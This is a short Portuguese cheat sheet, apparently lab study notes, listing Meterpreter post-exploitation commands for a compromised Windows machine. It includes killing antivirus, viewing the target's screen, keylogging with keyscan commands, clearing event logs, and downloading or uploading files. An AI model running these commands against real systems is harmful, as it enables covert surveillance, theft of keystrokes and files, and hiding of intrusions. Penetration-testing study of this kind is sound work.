# Comandos

## quando estiver com privilegios , é possível rodar esses comandos

- `run post/windows/manage/killav` - para matar algum antivirus presente na maquina

- `run vnc` - abrira uma janela e mostrará a tela na maquina alvo e tudo que o alvo está fazendo

- `screenshare` - semelhante ao vnc , porém abre um janela no navegador,tem delay e não o ponteiro

- `keyscan_start` - para capturar tudo que o alvo digita

- `keycan_dump` - para listar tudo que foi capturar

- `keyscan_stop` - para finalizar o processo

- `clearev` - para limpar logs e deixar os processos mais rapidos

- `search -d C:/Users -f *.txt` com o comando `search` seguido de um caminho é possível procurar um arquvio ou oq quiser

- Com o comando `download` e o caminho é possivel baixar um arquivo da maquina alvo ex: `download C:/Users/vboxuser/My Documents/flag.txt`

- com o comandoo `upload` é fazer fazer o upload de arquivos ex: `upload teste_upload  C:/Users/vboxuser/'My Documents'`

- tem como usar um modulo que dá recomendações de exploit , para a maquina da sessão atual modulo : `se post/multi/recon/local_exploit_suggester`
  - setar a sessão que está conectado `set session 2`
  - `set SHOWDESCRIPTION true` para mostrar a descrição
  - e `run`
